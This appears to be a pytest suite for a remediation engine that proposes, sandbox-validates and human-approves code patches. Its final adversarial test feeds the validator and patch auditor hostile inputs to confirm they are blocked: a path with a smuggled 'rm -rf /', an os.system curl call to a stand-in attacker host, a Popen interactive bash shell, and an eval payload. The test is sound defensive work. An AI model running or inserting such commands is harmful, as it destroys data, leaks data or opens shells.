"""
Integration and Unit Tests for AFTERMATH Remediation Engine (Milestone 4).
Verifies:
- Sandbox security boundaries and path traversal rejection
- GNU unified diff generation and SHA-256 fingerprinting
- Genuine sandboxed pytest execution (pre-patch fails invariant, post-patch passes)
- Supervised human approval / rejection gatekeeper lifecycle
- Full API endpoints
"""
import pytest
from fastapi import HTTPException
from app.services.remediation_engine import (
    validate_target_path,
    generate_remediation_diff,
    execute_sandbox_validation,
    PATCHED_PROCESSOR_SOURCE,
)


def test_sandbox_security_rejections():
    """Verifies that unauthorized or traversing paths are strictly blocked."""
    # 1. Directory traversal attempt
    with pytest.raises(HTTPException) as exc1:
        validate_target_path("../backend/app/main.py")
    assert exc1.value.status_code in (400, 403)

    # 2. Unauthorized file attempt outside allowlist
    with pytest.raises(HTTPException) as exc2:
        validate_target_path(".env")
    assert exc2.value.status_code in (400, 403)

    # 3. Backend internal file attempt
    with pytest.raises(HTTPException) as exc3:
        validate_target_path("backend/app/config.py")
    assert exc3.value.status_code == 403

    # 4. Legitimate target path succeeds
    path = validate_target_path("services/payment_worker/processor.py")
    assert path.exists()
    assert path.name == "processor.py"


def test_remediation_diff_generation():
    """Verifies unified diff calculation and SHA-256 fingerprinting."""
    diff_text, patch_hash, changed_files, patched_source = generate_remediation_diff(
        "services/payment_worker/processor.py"
    )
    assert len(diff_text) > 0
    assert "--- a/services/payment_worker/processor.py" in diff_text
    assert "+++ b/services/payment_worker/processor.py" in diff_text
    assert "asyncio.Lock" in diff_text
    assert len(patch_hash) == 64  # SHA-256
    assert changed_files == ["services/payment_worker/processor.py"]
    assert "REMEDIATED" in patched_source


def test_genuine_sandboxed_test_execution():
    """
    GENUINE VERIFICATION:
    Executes actual isolated pytest runs against both unpatched (fails)
    and patched (passes) implementations of the payment worker.
    """
    evidence = execute_sandbox_validation(
        target_file_path="services/payment_worker/processor.py",
        patched_source=PATCHED_PROCESSOR_SOURCE,
    )

    assert evidence["verified"] is True
    # Pre-patch must fail invariant INV-PAY-001 (5 duplicate debit transactions)
    assert evidence["pre_patch_run"]["exit_code"] != 0
    assert evidence["pre_patch_run"]["failed"] == 1
    assert "INVARIANT VIOLATED (INV-PAY-001)" in evidence["pre_patch_run"]["stdout"]

    # Post-patch must pass all tests with atomic deduplication
    assert evidence["post_patch_run"]["exit_code"] == 0
    assert evidence["post_patch_run"]["failed"] == 0
    assert evidence["post_patch_run"]["passed"] == 3
    assert "3 passed" in evidence["post_patch_run"]["stdout"]


@pytest.mark.asyncio
async def test_remediation_workflow_api_approval_lifecycle(client):
    """
    Tests complete API lifecycle:
    TRIGGER -> PROPOSED -> VALIDATE (AWAITING_APPROVAL) -> APPROVE (COMPLETED)
    """
    # 1. Trigger remediation workflow
    trigger_payload = {
        "release_id": "rel-2026-001",
        "triggering_experiment_id": "exp-vuln-001",
        "violated_invariant": "INV-PAY-001: Exactly-One-Charge-Per-Purchase",
        "causal_node_id": "node-inv-001",
        "target_file_path": "services/payment_worker/processor.py",
    }
    create_res = await client.post("/api/v1/remediations/trigger", json=trigger_payload)
    assert create_res.status_code == 201
    workflow = create_res.json()
    wf_id = workflow["id"]
    assert workflow["status"] == "PATCH_PROPOSED"
    assert workflow["patch_diff"] is not None
    assert workflow["approval_status"] == "PENDING"

    # 2. Premature approval must be rejected by state machine
    premature_approve = await client.post(
        f"/api/v1/remediations/workflows/{wf_id}/approve",
        json={"approver_name": "CTO Jane Doe", "approver_email": "jane@aftermath.dev"},
    )
    assert premature_approve.status_code == 400

    # 3. Execute isolated sandbox validation
    val_res = await client.post(f"/api/v1/remediations/workflows/{wf_id}/validate")
    assert val_res.status_code == 200
    validated_wf = val_res.json()
    assert validated_wf["status"] == "AWAITING_APPROVAL"
    assert validated_wf["validation_results"]["verified"] is True
    assert validated_wf["validation_results"]["post_patch_run"]["exit_code"] == 0

    # 4. Human gatekeeper approves the patch
    approve_res = await client.post(
        f"/api/v1/remediations/workflows/{wf_id}/approve",
        json={
            "approver_name": "CTO Jane Doe",
            "approver_email": "jane@aftermath.dev",
            "note": "Verified zero double charges under 5 concurrent retries. Approved for production merge.",
        },
    )
    assert approve_res.status_code == 200
    approved_wf = approve_res.json()
    assert approved_wf["status"] == "COMPLETED"
    assert approved_wf["approval_status"] == "APPROVED"
    assert approved_wf["approval_decision"]["approver_name"] == "CTO Jane Doe"

    # 5. Get patch diff endpoint
    diff_res = await client.get(f"/api/v1/remediations/workflows/{wf_id}/diff")
    assert diff_res.status_code == 200
    assert "asyncio.Lock" in diff_res.json()["patch_diff"]


@pytest.mark.asyncio
async def test_remediation_workflow_api_rejection_lifecycle(client):
    """
    Tests complete rejection lifecycle:
    TRIGGER -> VALIDATE -> REJECT
    """
    # 1. Trigger remediation
    trigger_payload = {
        "release_id": "rel-2026-001",
        "target_file_path": "services/payment_worker/processor.py",
    }
    create_res = await client.post("/api/v1/remediations/trigger", json=trigger_payload)
    assert create_res.status_code == 201
    wf_id = create_res.json()["id"]

    # 2. Validate
    val_res = await client.post(f"/api/v1/remediations/workflows/{wf_id}/validate")
    assert val_res.status_code == 200

    # 3. Reject with technical justification
    reject_res = await client.post(
        f"/api/v1/remediations/workflows/{wf_id}/reject",
        json={
            "approver_name": "Staff SRE Bob",
            "approver_email": "bob@aftermath.dev",
            "reason": "Requires distributed Redis Redlock instead of in-memory mutex for multi-pod deployment.",
        },
    )
    assert reject_res.status_code == 200
    rejected_wf = reject_res.json()
    assert rejected_wf["status"] == "REJECTED"
    assert rejected_wf["approval_status"] == "REJECTED"
    assert "Redis Redlock" in rejected_wf["approval_decision"]["reason"]


def test_adversarial_security_hardening():
    """
    Phase 3 Adversarial Hardening Verification:
    - Path traversal with shell injection tokens
    - Non-Python extension rejection (.sh, .env, .bat)
    - Malicious patch payload injection (eval, subprocess.Popen, os.system)
    - Symlink exploitation
    """
    from app.services.remediation_engine import audit_patch_safety, validate_target_path

    # 1. Shell metacharacter injection
    with pytest.raises(HTTPException) as exc_shell:
        validate_target_path("services/payment_worker/processor.py; rm -rf /")
    assert exc_shell.value.status_code == 400

    # 2. Non-python extension rejection
    with pytest.raises(HTTPException) as exc_ext:
        validate_target_path("services/payment_worker/attack.sh")
    assert exc_ext.value.status_code == 400

    # 3. Malicious diff payload with os.system
    malicious_patch_1 = "import os\nos.system('curl http://malicious.attacker.com/leak')"
    with pytest.raises(HTTPException) as exc_payload1:
        audit_patch_safety(malicious_patch_1)
    assert exc_payload1.value.status_code == 403
    assert "os.system" in exc_payload1.value.detail

    # 4. Malicious diff payload with subprocess.Popen
    malicious_patch_2 = "import subprocess\nsubprocess.Popen(['bash', '-i'])"
    with pytest.raises(HTTPException) as exc_payload2:
        audit_patch_safety(malicious_patch_2)
    assert exc_payload2.value.status_code == 403
    assert "subprocess.Popen" in exc_payload2.value.detail

    # 5. Malicious diff payload with eval()
    malicious_patch_3 = "result = eval('__import__(\"os\").getcwd()')"
    with pytest.raises(HTTPException) as exc_payload3:
        audit_patch_safety(malicious_patch_3)
    assert exc_payload3.value.status_code == 403
    assert "eval(" in exc_payload3.value.detail
